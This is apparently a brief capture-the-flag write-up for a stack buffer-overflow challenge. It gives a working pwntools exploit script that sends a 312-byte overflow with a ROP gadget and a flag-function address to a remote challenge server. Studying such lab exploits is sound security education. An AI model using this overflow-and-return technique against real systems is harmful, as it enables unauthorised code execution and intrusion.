# BOF

/Summary :
* Simple pwn challenge
* Use cyclic for finding the segfault location
* No ASLR nor Canary nor NX so we just simply ovf 

** **

Code : 
~~~python
from pwn import *

  

def exp():

	f = remote('35.246.134.224', 31593)

  
  

	flagAdr = 0x00400767

	ropp= 0x004008dc # any ROP gadget will work

  

	offset = 312 #our exploit found only 304 but it also 
	#only overflowed the BSP, we know we need to 
	#reach RIP so we add 8 bytes (to ovf the next stack addr)

  

	payload = b"a" * offset + p64(ropp) + p64(flagAdr)

  

	f.sendline(payload)

	f.interactive()

  
  

exp()

 
~~~